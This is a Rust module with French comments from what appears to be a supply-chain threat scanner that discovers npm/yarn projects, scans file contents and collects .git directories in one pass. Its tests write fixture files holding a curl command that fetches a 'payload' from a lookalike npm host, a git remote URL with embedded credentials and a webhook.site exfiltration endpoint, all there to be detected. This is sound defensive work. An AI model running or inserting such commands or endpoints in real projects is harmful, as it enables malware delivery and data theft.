//! Parcours unifié du workspace (SPEC-F02/F03/F05/F08) : un seul passage combine la
//! découverte de projets npm/yarn (`discovery::project_from_package_json`) et le scan
//! passif de contenu (`scan::scan_file`), au lieu de deux parcours indépendants de
//! l'arborescence — un coût significatif sur de très grandes racines (`C:\`, `/`, sans
//! `.gitignore` pour élaguer quoi que ce soit). Les dossiers `.git` rencontrés sont
//! collectés par leur chemin (`walker::walk_including_hidden` les capture au passage,
//! sans jamais y descendre) pour être analysés a posteriori par `hunt::scan_git_configs`,
//! sans troisième parcours dédié.

use std::path::{Path, PathBuf};
use std::sync::{Arc, Mutex};

use tracing::debug;

use crate::discovery::{project_from_package_json, Project};
use crate::hunt::ThreatSignal;
use crate::iocs::IocsConfig;
use crate::progress::DotProgress;
use crate::scan;

/// Résultat du parcours unifié du workspace.
pub struct WorkspaceWalk {
    pub projects: Vec<Project>,
    pub threat_signals: Vec<ThreatSignal>,
    pub install_command_mentions: Vec<PathBuf>,
    /// Dossiers `.git` rencontrés (chemin du dossier lui-même, pas de son `config`),
    /// jamais parcourus en profondeur — à analyser via `hunt::scan_git_configs`.
    pub git_dirs: Vec<PathBuf>,
}

/// Parcourt `root` une seule fois (dotfiles inclus, SPEC-F08) pour la découverte de
/// projets (SPEC-F03), le scan passif (SPEC-F05/F08) et le repérage des dépôts `.git`
/// (SPEC-F08) — au lieu de trois parcours indépendants de la même arborescence.
pub fn walk_workspace(
    root: &Path,
    progress: &DotProgress,
    no_ignore: bool,
    config: &IocsConfig,
) -> WorkspaceWalk {
    let git_dirs = Arc::new(Mutex::new(Vec::new()));
    let mut projects = Vec::new();
    let mut threat_signals = Vec::new();
    let mut install_command_mentions = Vec::new();

    for entry in
        crate::walker::walk_including_hidden(root, progress, no_ignore, Arc::clone(&git_dirs))
    {
        let path = entry.path();
        if !entry.file_type().is_some_and(|ft| ft.is_file()) {
            continue;
        }

        if let Some(project) = project_from_package_json(path) {
            projects.push(project);
        }

        if let Some(result) = scan::scan_file(path, config) {
            threat_signals.extend(result.threat_signals);
            install_command_mentions.extend(result.install_mention);
        }
    }

    for project in &projects {
        // DEBUG (pas INFO) : un projet par ligne inonderait la console par défaut sur
        // un gros workspace. Le décompte global reste visible via l'indicateur de
        // progression (SPEC-T02/T04).
        debug!(
            project = %project.root.display(),
            npm_lock = project.has_npm_lock,
            yarn_lock = project.has_yarn_lock,
            "projet npm/yarn découvert"
        );
    }

    let git_dirs = Arc::try_unwrap(git_dirs)
        .expect("aucune autre référence au collecteur de dossiers .git après le parcours")
        .into_inner()
        .expect("le mutex du collecteur de dossiers .git ne doit jamais être empoisonné");

    WorkspaceWalk {
        projects,
        threat_signals,
        install_command_mentions,
        git_dirs,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn default_config() -> IocsConfig {
        crate::iocs::load(None).unwrap()
    }

    #[test]
    fn discovers_projects_and_scans_content_in_a_single_pass() {
        let config = default_config();
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("package.json"), "{}").unwrap();
        std::fs::write(dir.path().join("package-lock.json"), "{}").unwrap();
        std::fs::write(
            dir.path().join("deploy.sh"),
            "curl https://npm-cache.com/payload",
        )
        .unwrap();

        let result = walk_workspace(dir.path(), &DotProgress::new(false), false, &config);

        assert_eq!(result.projects.len(), 1);
        assert!(result.projects[0].has_npm_lock);
        assert_eq!(result.threat_signals.len(), 1);
        assert!(result.threat_signals[0].path.ends_with("deploy.sh"));
    }

    #[test]
    fn collects_git_dirs_without_descending_into_them() {
        let config = default_config();
        let dir = tempfile::tempdir().unwrap();
        let git_dir = dir.path().join("repo").join(".git");
        std::fs::create_dir_all(&git_dir).unwrap();
        std::fs::write(
            git_dir.join("config"),
            "[remote \"origin\"]\n\turl = http://user:pw@example.com/x.git\n",
        )
        .unwrap();
        // Contenu potentiellement énorme d'un vrai .git : jamais parcouru, jamais
        // scanné comme un fichier normal (webhook.site ne doit pas être remonté).
        std::fs::create_dir_all(git_dir.join("objects")).unwrap();
        std::fs::write(git_dir.join("objects").join("pack"), "webhook.site").unwrap();

        let result = walk_workspace(dir.path(), &DotProgress::new(false), false, &config);

        assert_eq!(result.git_dirs, vec![git_dir]);
        assert!(result.threat_signals.is_empty());
    }

    #[test]
    fn no_git_dirs_when_none_present() {
        let config = default_config();
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("README.md"), "hello").unwrap();

        let result = walk_workspace(dir.path(), &DotProgress::new(false), false, &config);
        assert!(result.git_dirs.is_empty());
    }
}
